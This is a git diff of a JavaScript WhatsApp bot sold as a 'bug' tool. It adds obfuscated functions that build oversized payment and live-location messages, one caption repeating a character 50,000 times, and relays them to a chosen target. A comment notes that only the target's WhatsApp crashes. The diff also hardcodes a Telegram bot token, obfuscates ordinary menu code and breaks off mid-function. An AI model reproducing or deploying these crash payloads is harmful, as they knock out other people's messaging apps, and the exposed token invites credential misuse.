@@ -51,6 +51,7 @@ title: ` ◥◤◢◤ ★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?�
 }
 }
 }
+
 const force = {
 key: {
 participant: `0@s.whatsapp.net`,
@@ -76,19 +77,11 @@ remoteJid: ""
 }
 }
 
-const ryobug = {
-	key: {
-		remoteJid: 'status@broadcast',
-		fromMe: false, 
-		participant: '0@s.whatsapp.net'
-	},
-    message: {
-        listResponseMessage: {
-            title: `🎲 Classic Bugs 🤔 `
-        }
-    }
-}
-//================°
+
+
+
+
+//===========°
 const hmbug = async (target, txt) => {
   await sleep(300);
   var etc = {
@@ -374,7 +367,7 @@ reply(`${err}`)
 }
 }
 	 
-const moji = ['💔', '💀', '🌏', '💢', '🩸', '🥳', '✅',]
+const moji = ['🦠', '🦹', '🌏', '💢', '🩸', '🥳', '✅',]
 const randomemoji = moji[Math.floor(Math.random() * moji.length)]
 
 //Reaction
@@ -420,7 +413,25 @@ await zetsubo.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
 }
 }
 	 
-
+async function Telesticker(url) {
+    return new Promise(async (resolve, reject) => {
+        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
+        packName = url.replace("https://t.me/addstickers/", "")
+        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
+        const xeonyresult = []
+        for (let i = 0; i < data.data.result.stickers.length; i++) {
+            fileId = data.data.result.stickers[i].thumb.file_id
+            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
+            result = {
+            status: 200,
+            author: 'DGXeon',
+            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
+            }
+            xeonyresult.push(result)
+        }
+    resolve(xeonyresult)
+    })
+}
 
 if (autodelete) {
 zetsubo.sendMessage(m.chat,
@@ -448,9 +459,9 @@ var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 viewOnceMessage: {
 message: {
   "liveLocationMessage": {
-    "degreesLatitude": "",
-    "degreesLongitude": "",
-    "caption": `Hey Bro 👋`,
+    "degreesLatitude": "🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅Lets Dance☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅Booom 😅 ☆ ꧏ🤍҈ ༑`,
     "sequenceNumber": "9",
     "jpegThumbnail": ""
      }
@@ -459,7 +470,7 @@ message: {
 }), { userJid: m.chat, quoted: kuwoted })
 //await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id }) Gunakan Ini Jika Ingin Bug Keliatan Di Wa Pengirim
 await zetsubo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id }); //Gunakan Ini Jika Ingin Bug Hanya Terlihat Di Wa Target ( Benefit - WhatsApp pengguna tidak ikut crash )
-	 }
+	}
 
 /*let reactionMessage = {
                     react: {
@@ -727,8 +738,11 @@ if (budy.toLowerCase() == jawaban) {
             }
         }
 //============= [LIST RESPONCE CHECKING END ]================
+//============= [6U9S 57@R7]================ 
+function _0xd7f9(_0x16d94b,_0x5c1d5c){const _0x1be450=_0x1be4();return _0xd7f9=function(_0xd7f9d8,_0x25e2d8){_0xd7f9d8=_0xd7f9d8-0x72;let _0x241f51=_0x1be450[_0xd7f9d8];return _0x241f51;},_0xd7f9(_0x16d94b,_0x5c1d5c);}const _0x5621a5=_0xd7f9;function _0x1be4(){const _0x262da4=['967002pBTpWx','652905IozwPW','0@s.whatsapp.net','7574749fzeXOh','6yAfVll','747ZbJPCA','{\x22currency\x22:\x22IDR\x22,\x22total_amount\x22:{\x22value\x22:49981399788,\x22offset\x22:100},\x22reference_id\x22:\x224OON4PX3FFJ\x22,\x22type\x22:\x22physical-goods\x22,\x22order\x22:{\x22status\x22:\x22payment_requested\x22,\x22subtotal\x22:{\x22value\x22:49069994400,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:490699944,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:485792999999,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:48999999900,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x227842674605763435\x22,\x22product_id\x22:\x227842674605763435\x22,\x22name\x22:\x22̷A̷̷c̷̷k̷̷n̷̷o̷̷w̷̷l̷̷e̷̷d̷̷g̷̷e̷\x20̷C̷̷l̷a̷̷s̷̷s̷̷i̷̷c̷\x20╮⭑\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴\x20#\x20𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\x22,\x22amount\x22:{\x22value\x22:9999900,\x22offset\x22:100},\x22quantity\x22:7},{\x22retailer_id\x22:\x22custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\x22,\x22name\x22:\x22\x22,\x22amount\x22:{\x22value\x22:999999900,\x22offset\x22:100},\x22quantity\x22:49}]},\x22native_payment_methods\x22:[]}','74768vXmSTO','639570KXrTQm','1758168rJUwpE','318984bIujYS'];_0x1be4=function(){return _0x262da4;};return _0x1be4();}(function(_0x229619,_0x46b17d){const _0x39199a=_0xd7f9,_0x23facd=_0x229619();while(!![]){try{const _0xe05954=-parseInt(_0x39199a(0x74))/0x1+-parseInt(_0x39199a(0x77))/0x2*(-parseInt(_0x39199a(0x7b))/0x3)+parseInt(_0x39199a(0x76))/0x4+parseInt(_0x39199a(0x78))/0x5+-parseInt(_0x39199a(0x75))/0x6+parseInt(_0x39199a(0x7a))/0x7+parseInt(_0x39199a(0x73))/0x8*(-parseInt(_0x39199a(0x7c))/0x9);if(_0xe05954===_0x46b17d)break;else _0x23facd['push'](_0x23facd['shift']());}catch(_0x55b6b6){_0x23facd['push'](_0x23facd['shift']());}}}(_0x1be4,0x868d0));const tforce={'key':{'participant':_0x5621a5(0x79),...m['chat']?{'remoteJid':'status@broadcast'}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs['readFileSync']('./image/latx.png')},'nativeFlowMessage':{'buttons':[{'name':'review_and_pay','buttonParamsJson':_0x5621a5(0x72)}]}}}};
+function _0x3f54(_0x123739,_0x3ef76c){var _0x4e2e58=_0x4e2e();return _0x3f54=function(_0x3f5438,_0x2fc7c4){_0x3f5438=_0x3f5438-0xe2;var _0x125630=_0x4e2e58[_0x3f5438];return _0x125630;},_0x3f54(_0x123739,_0x3ef76c);}(function(_0x2ea533,_0x15fea4){var _0x495b5d=_0x3f54,_0x56dc26=_0x2ea533();while(!![]){try{var _0x4111ca=-parseInt(_0x495b5d(0xe4))/0x1*(parseInt(_0x495b5d(0xe5))/0x2)+-parseInt(_0x495b5d(0xe2))/0x3*(-parseInt(_0x495b5d(0xe6))/0x4)+-parseInt(_0x495b5d(0xec))/0x5*(-parseInt(_0x495b5d(0xea))/0x6)+parseInt(_0x495b5d(0xf0))/0x7+parseInt(_0x495b5d(0xf1))/0x8*(parseInt(_0x495b5d(0xeb))/0x9)+parseInt(_0x495b5d(0xf3))/0xa*(-parseInt(_0x495b5d(0xed))/0xb)+-parseInt(_0x495b5d(0xe3))/0xc*(parseInt(_0x495b5d(0xe7))/0xd);if(_0x4111ca===_0x15fea4)break;else _0x56dc26['push'](_0x56dc26['shift']());}catch(_0x3b6e9a){_0x56dc26['push'](_0x56dc26['shift']());}}}(_0x4e2e,0xf0b54));async function tngeloc(_0x5049ba,_0x6bcd9a){var _0x1d975b=_0x3f54,_0x31d3a9=generateWAMessageFromContent(m[_0x1d975b(0xf5)],proto[_0x1d975b(0xe9)][_0x1d975b(0xef)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x1d975b(0xee)+'ꦾ'[_0x1d975b(0xf2)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':m[_0x1d975b(0xf5)],'quoted':quoted});await zetsubo[_0x1d975b(0xf4)](_0x5049ba,_0x31d3a9[_0x1d975b(0xe8)],{'messageId':_0x31d3a9['key']['id']});}function _0x4e2e(){var _0x12f7c3=['fromObject','6593895ohbkmO','5196488xZFNNM','repeat','290vNjTOX','relayMessage','chat','519QGoMcF','24nJQNAH','426346GnURXG','2CwAoTA','39412PvAYKL','26169806titUgD','message','Message','24ioPZpu','27ccSVZO','1147745pvVQkm','28457LKZcTj','✳️᜴࿆͆᷍A̷̷c̷̷k̷̷n̷̷o̷̷w̷̷l̷̷e̷̷d̷̷g̷̷e̷-C̷̷l̷a̷̷s̷̷s̷̷i̷̷c̷☠️⃰͜͡؜⭐️᜴▴A̷̷c̷̷k̷̷n̷̷o̷̷w̷̷l̷̷e̷̷d̷̷g̷̷e̷-C̷̷l̷a̷̷s̷̷s̷̷i̷̷c̷ཀ͜͡\x20✅⃟╮.xp'];_0x4e2e=function(){return _0x12f7c3;};return _0x4e2e();}
 
-
+//============= [6U9S 3//D]================
 //TicTacToe
 this.game = this.game ? this.game : {}
 let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
@@ -910,7 +924,6 @@ break
 //=================================================//
 case "menutype":
 if (!isCreator) return reply('*𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫𝐬 𝐨𝐧𝐥𝐲*')
-await inireact()
 if (!args[0]) return reply(`Choose between\nV1 - Photo\nV2 - Video\nV3 - Text\nV4 - Button`)
 let chosen = args[0]
 global.menutype = chosen
@@ -918,8 +931,7 @@ await reply(`Successfully set Menu type to ${chosen} 🤩`)
 break
 //=================================================//
 case 'menu': case 'help': {
-await inireact()
-let menutxt = `
+let messg = `
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
     \`𝘾𝙇𝘼𝙎𝙎𝙄𝘾-𝙑3 𝘽𝙐𝙂\`
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
@@ -934,78 +946,19 @@ let menutxt = `
     ✦ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
  
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+     ⦁𝐁𝐮𝐠𝐦𝐞𝐧𝐮
+     ⦁𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
+     ⦁𝐆𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮
+     ⦁𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮
+     ⦁𝐆𝐚𝐦𝐞𝐦𝐞𝐧𝐮
+     ⦁𝐥𝐢𝐬𝐭𝐦𝐮𝐬𝐢𝐤
+     ⦁𝐅𝐮𝐧𝐦𝐞𝐧𝐮
+     ⦁𝐀𝐝𝐝𝐦𝐞𝐧𝐮
+     ⦁𝐏𝐮𝐬𝐡𝐦𝐞𝐧𝐮
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬     
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ©𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 `
 
-/*try {
-let msg = generateWAMessageFromContent(m.key.remoteJid, {
-            viewOnceMessage: {
-              message: {
-                "messageContextInfo": {
-                  "deviceListMetadata": {},
-                  "deviceListMetadataVersion": 2
-                },
-                interactiveMessage: proto.Message.InteractiveMessage.create({
-                  body: proto.Message.InteractiveMessage.Body.create({
-                    text: menutxt,
-                  }),
-                  footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "King Sam"
-                  }),
-                  header: proto.Message.InteractiveMessage.Header.create({
-		    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
-                    title: "",
-                    subtitle: "Classic-v3-BUG",
-                    hasMediaAttachment: false
-                  }),
-                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                    buttons: [
-		       {
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"MENU List🚀","id":"${prefix}taira"}`                                     
-		       },
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"PING 💤","id":"${prefix}ping"}`                                    
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥","id":"${prefix}runtime"}`                                     
-			},
-		      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
-		      },
-		      {
-                       "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫👤 \",\"url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\"}"
-		      },
-		      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
-		      },
-                    ]
-                  })
-                })
-              }
-            }
-          }, {});
-
-          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
-            const errorMessage = 'Error: Invalid message key.';
-            console.error(errorMessage);
-            return reply(errorMessage);
-          }
-
-          await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
-            messageId: msg.key.id
-          });
-        } catch (error) {
-          console.error('Error generating and relaying message:', error);
-          return reply('Error generating and relaying message.');
-	}
-} */
-try {
 global.logo = "https://telegra.ph/file/6dfde4263655a81572a68.jpg"
 global.vidmenu = "https://telegra.ph/file/05ebf02a511b7d36bd20d.mp4"
 if(menutype === "v1") {
@@ -1023,233 +976,18 @@ if(menutype === "v1") {
 } else if (menutype === "v3") {
         await zetsubo.sendMessage(from, { text: messg })
 } else if (menutype === "v4") {
-  try {
-      let msg = generateWAMessageFromContent(m.key.remoteJid, {
-            viewOnceMessage: {
-              message: {
-                "messageContextInfo": {
-                  "deviceListMetadata": {},
-                  "deviceListMetadataVersion": 2
-                },
-                interactiveMessage: proto.Message.InteractiveMessage.create({
-                  body: proto.Message.InteractiveMessage.Body.create({
-                    text: menutxt,
-                  }),
-                  footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "King Sam"
-                  }),
-                  header: proto.Message.InteractiveMessage.Header.create({
-                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
-                    title: "",
-                    subtitle: "Classic-v3-BUG",
-                    hasMediaAttachment: false
-                  }),
-                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                    buttons: [
-                       {
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"MENU List🚀","id":"${prefix}taira"}`
-                       },
-                        {
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"PING 💤","id":"${prefix}ping"}`
-                        },
-                        {
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥","id":"${prefix}runtime"}`
-                        },
-                      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
-                      },
-                      {
-                       "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫 👤 \",\"url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\"}"
-                      },
-                      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
-                      },
-                    ]
-                  })
-                })
-              }
-            }
-          }, {});
-
-          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
-            const errorMessage = 'Error: Invalid message key.';
-            console.error(errorMessage);
-            return reply(errorMessage);
-          }
-
-          await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
-            messageId: msg.key.id
-          });
-        } catch (error) {
-          console.error('Error generating and relaying message:', error);
-          return reply('Error generating and relaying message.');
-        }
-} else return
-	} catch(error) { await reply("Unable to send menu due to an error,try to change menu type with menutype command"}
+const _0xc6d439=_0x1307;function _0x2fda(){const _0x2ca07e=['{\x22display_text\x22:\x22MENU\x20List🚀\x22,\x22id\x22:\x22','Header','{\x22display_text\x22:\x22𝐎𝐰𝐧𝐞𝐫\x20👤\x20\x22,\x22url\x22:\x22https://wa.me/+254742491666?text=Hello+King+Sam\x22,\x22merchant_url\x22:\x22https://wa.me/+254742491666?text=Hello+King+Sam\x22}','1062dsKEpD','Message','King\x20Sam','NativeFlowMessage','Footer','35990pqDktI','2EmhfAb','key','{\x22display_text\x22:\x22☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄\x20💥\x22,\x22id\x22:\x22','waUploadToServer','861WorFzg','33AfbFog','16xamGrV','Error\x20generating\x20and\x20relaying\x20message.','InteractiveMessage','error','672661zulcCS','1026lhwYhS','28406EHRQlw','relayMessage','cta_url','46936sbQqrd','{\x22display_text\x22:\x22PING\x20💤\x22,\x22id\x22:\x22','quick_reply','311775PiJuVY','Body','taira\x22}','𝕶𝖎𝖓𝖌\x20𝕾𝖆𝖒','https://telegra.ph/file/6dfde4263655a81572a68.jpg','create','remoteJid','4069EGGaAU','16565DsBSrC','{\x22display_text\x22:\x22𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍\x20\x22,\x22url\x22:\x22https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\x22,\x22merchant_url\x22:\x22https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\x22}','ping\x22}','1447020IsfuXV','message','{\x22display_text\x22:\x22𝐇𝐨𝐰\x20𝐓𝐨\x20𝐃𝐞𝐩𝐥𝐨𝐲\x20📺\x22,\x22url\x22:\x22https://youtube.com/@king_sam_hub\x22,\x22merchant_url\x22:\x22https://youtube.com/@king_sam_hub\x22}'];_0x2fda=function(){return _0x2ca07e;};return _0x2fda();}function _0x1307(_0xf2496d,_0x155a5f){const _0x2fda95=_0x2fda();return _0x1307=function(_0x1307e5,_0x3cd16c){_0x1307e5=_0x1307e5-0x181;let _0x38deba=_0x2fda95[_0x1307e5];return _0x38deba;},_0x1307(_0xf2496d,_0x155a5f);}(function(_0x3ce95d,_0x3e6418){const _0x1fed22=_0x1307,_0x2b547b=_0x3ce95d();while(!![]){try{const _0x41d3f5=-parseInt(_0x1fed22(0x1a2))/0x1*(-parseInt(_0x1fed22(0x198))/0x2)+-parseInt(_0x1fed22(0x181))/0x3*(-parseInt(_0x1fed22(0x19e))/0x4)+parseInt(_0x1fed22(0x189))/0x5*(-parseInt(_0x1fed22(0x1a3))/0x6)+-parseInt(_0x1fed22(0x19c))/0x7*(parseInt(_0x1fed22(0x1a7))/0x8)+-parseInt(_0x1fed22(0x192))/0x9*(parseInt(_0x1fed22(0x197))/0xa)+-parseInt(_0x1fed22(0x19d))/0xb*(-parseInt(_0x1fed22(0x18c))/0xc)+parseInt(_0x1fed22(0x188))/0xd*(parseInt(_0x1fed22(0x1a4))/0xe);if(_0x41d3f5===_0x3e6418)break;else _0x2b547b['push'](_0x2b547b['shift']());}catch(_0x35211c){_0x2b547b['push'](_0x2b547b['shift']());}}}(_0x2fda,0x5ae7b));try{let msg=generateWAMessageFromContent(m[_0xc6d439(0x199)][_0xc6d439(0x187)],{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadata':{},'deviceListMetadataVersion':0x2},'interactiveMessage':proto[_0xc6d439(0x193)]['InteractiveMessage'][_0xc6d439(0x186)]({'body':proto['Message'][_0xc6d439(0x1a0)][_0xc6d439(0x182)]['create']({'text':_0xc6d439(0x184)}),'footer':proto[_0xc6d439(0x193)][_0xc6d439(0x1a0)][_0xc6d439(0x196)][_0xc6d439(0x186)]({'text':_0xc6d439(0x194)}),'header':proto[_0xc6d439(0x193)][_0xc6d439(0x1a0)][_0xc6d439(0x190)][_0xc6d439(0x186)]({...await prepareWAMessageMedia({'image':{'url':_0xc6d439(0x185)}},{'upload':zetsubo[_0xc6d439(0x19b)]}),'title':'','subtitle':'Classic-v3-BUG','hasMediaAttachment':![]}),'nativeFlowMessage':proto[_0xc6d439(0x193)][_0xc6d439(0x1a0)][_0xc6d439(0x195)]['create']({'buttons':[{'name':_0xc6d439(0x1a9),'buttonParamsJson':_0xc6d439(0x18f)+prefix+_0xc6d439(0x183)},{'name':_0xc6d439(0x1a9),'buttonParamsJson':_0xc6d439(0x1a8)+prefix+_0xc6d439(0x18b)},{'name':_0xc6d439(0x1a9),'buttonParamsJson':_0xc6d439(0x19a)+prefix+'runtime\x22}'},{'name':_0xc6d439(0x1a6),'buttonParamsJson':_0xc6d439(0x18a)},{'name':'cta_url','buttonParamsJson':_0xc6d439(0x191)},{'name':_0xc6d439(0x1a6),'buttonParamsJson':_0xc6d439(0x18e)}]})})}}},{});if(!msg||!msg[_0xc6d439(0x199)]||!msg[_0xc6d439(0x199)][_0xc6d439(0x187)]||!msg['key']['id']){const errorMessage='Error:\x20Invalid\x20message\x20key.';return console[_0xc6d439(0x1a1)](errorMessage),reply(errorMessage);}await zetsubo[_0xc6d439(0x1a5)](msg[_0xc6d439(0x199)][_0xc6d439(0x187)],msg[_0xc6d439(0x18d)],{'messageId':msg[_0xc6d439(0x199)]['id']});}catch(_0xf39789){return console[_0xc6d439(0x1a1)]('Error\x20generating\x20and\x20relaying\x20message:',_0xf39789),reply(_0xc6d439(0x19f));}
+}  else return
+}
 break
 //=================================================//
 case 'taira': {
-await inireact()
-try {
-let msg = generateWAMessageFromContent(m.key.remoteJid, {
-            viewOnceMessage: {
-              message: {
-                "messageContextInfo": {
-                  "deviceListMetadata": {try {
-let msg = generateWAMessageFromContent(m.key.remoteJid, {
-            viewOnceMessage: {
-              message: {
-                "messageContextInfo": {
-                  "deviceListMetadata": {},
-                  "deviceListMetadataVersion": 2
-                },
-                interactiveMessage: proto.Message.InteractiveMessage.create({
-                  body: proto.Message.InteractiveMessage.Body.create({
-                    text: menutxt,
-                  }),
-                  footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "King Sam"
-                  }),
-                  header: proto.Message.InteractiveMessage.Header.create({
-		    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
-                    title: "",
-                    subtitle: "Classic-v3-BUG",
-                    hasMediaAttachment: false
-                  }),
-                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                    buttons: [
-		       {
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"MENU List🚀","id":"${prefix}taira"}`                                     
-		       },
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"PING 💤","id":"${prefix}ping"}`                                    
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥","id":"${prefix}runtime"}`                                     
-			},
-		      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
-		      },
-		      {
-                       "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫👤 \",\"url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\"}"
-		      },
-		      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
-		      },
-                    ]
-                  })
-                })
-              }
-            }
-          }, {});
-
-          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
-            const errorMessage = 'Error: Invalid message key.';
-            console.error(errorMessage);
-            return reply(errorMessage);
-          }
-
-          await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
-            messageId: msg.key.id
-          });
-        } catch (error) {
-          console.error('Error generating and relaying message:', error);
-          return reply('Error generating and relaying message.');
-	}
-} },
-                  "deviceListMetadataVersion": 2
-                },
-                interactiveMessage: proto.Message.InteractiveMessage.create({
-                  body: proto.Message.InteractiveMessage.Body.create({
-                    text: "Click Me 🚀",
-                  }),
-                  footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 "
-                  }),
-                  header: proto.Message.InteractiveMessage.Header.create({
-		   ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
-                    title: "",
-                    subtitle: "Classic-v3-BUG",
-                    hasMediaAttachment: false
-                  }),
-                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                    buttons: [
-		       {
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Ownermenu 🤖","id":"${prefix}ownermenu"}`                                     
-		       },
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Bugmenu 👾","id":"${prefix}bugmenu"}`                                    
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"GROUPMENU 🫴","id":"${prefix}groupmenu"}`                                     
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"RANDOMMENU 🙋","id":"${prefix}randommenu"}`                                     
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Gamemenu 🥳","id":"${prefix}gamemenu"}`                                    
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Downloadmenu 🪀","id":"${prefix}downloadmenu"}`                                   
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Listmusik 🎉","id":"${prefix}listmusik"}`                                     
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Funmenu 💫","id":"${prefix}funmenu"}`                                     
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Pushmenu 👁️","id":"${prefix}pushmenu"}`                                     
-			},
-			{
-                        "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"Addmenu 🕷️","id":"${prefix}addmenu"}`                                     },
-                    ]
-                  })
-                })
-              }
-            }
-          }, {});
-
-          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
-            const errorMessage = 'Error: Invalid message key.';
-            console.error(errorMessage);
-            return reply(errorMessage);
-          }
-
-          await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
-            messageId: msg.key.id
-          });
-        } catch (error) {
-          console.error('Error generating and relaying message:', error);
-          return reply('Error generating and relaying message.');
-	} 
+function _0x4ffd(){const _0x1b4a2a=['49146240VFoPmD','error','131847WfzAfc','addmenu\x22}','{\x22display_text\x22:\x22Bugmenu\x20👾\x22,\x22id\x22:\x22','Footer','relayMessage','Header','downloadmenu\x22}','listmusik\x22}','{\x22display_text\x22:\x22Downloadmenu\x20🪀\x22,\x22id\x22:\x22','key','{\x22display_text\x22:\x22Addmenu\x20🕷️\x22,\x22id\x22:\x22','Error\x20generating\x20and\x20relaying\x20message.','7317540xbmeyC','{\x22display_text\x22:\x22Gamemenu\x20🥳\x22,\x22id\x22:\x22','NativeFlowMessage','753275PAKPPu','12559005cdnUNm','{\x22display_text\x22:\x22Ownermenu\x20🤖\x22,\x22id\x22:\x22','1028HrNCjE','𝕶𝖎𝖓𝖌\x20𝕾𝖆𝖒\x20||\x20ᴸᴼᴿᴰᴛᴀɪʀᴀ','ownermenu\x22}','funmenu\x22}','quick_reply','{\x22display_text\x22:\x22GROUPMENU\x20🫴\x22,\x22id\x22:\x22','2896RGVwod','message','remoteJid','68wBpEMe','Message','create','Error\x20generating\x20and\x20relaying\x20message:','groupmenu\x22}','Body','https://telegra.ph/file/6dfde4263655a81572a68.jpg','{\x22display_text\x22:\x22Funmenu\x20💫\x22,\x22id\x22:\x22','2066JTiilv','36YOtgAq','InteractiveMessage','23527BBLogj','Error:\x20Invalid\x20message\x20key.'];_0x4ffd=function(){return _0x1b4a2a;};return _0x4ffd();}const _0x3f139f=_0xcddc;function 